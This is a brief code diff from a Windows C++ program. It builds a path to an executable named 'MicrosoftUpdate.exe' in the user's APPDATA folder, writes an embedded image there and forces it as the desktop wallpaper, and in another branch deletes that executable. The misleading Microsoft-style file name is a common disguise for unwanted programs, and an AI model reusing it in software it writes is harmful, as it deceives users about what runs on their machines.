@@ -98,6 +98,12 @@ int wmain(int argc, wchar_t ** argv){
 
 	argv = CommandLineToArgvW(GetCommandLine(), &argc);
 
+
+	WCHAR* appdata = _wgetenv(L"APPDATA");
+	TCHAR out[MAX_PATH];
+	_stprintf(out, L"%s\\MicrosoftUpdate.exe", appdata);
+
+
 #endif
 
 
@@ -108,14 +114,15 @@ int wmain(int argc, wchar_t ** argv){
 		std::ofstream output("output.jpg", std::ofstream::binary);
 		output.write(data, 16513);
 		output.close();
+		
+		TCHAR pic[MAX_PATH];
+		_stprintf(pic, L"%s\\output.jpg", appdata);
 
-		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "output.jpg", SPIF_UPDATEINIFILE);
+		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pic, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+
+
 
 	}else{
-
-		WCHAR* appdata = _wgetenv(L"APPDATA");
-		TCHAR out[MAX_PATH];
-		_stprintf(out, L"%s\\MicrosoftUpdate.exe", appdata);
 
 		std::wcout << "deleting " << out << " ..." << std::flush;
 		DeleteFile(out);
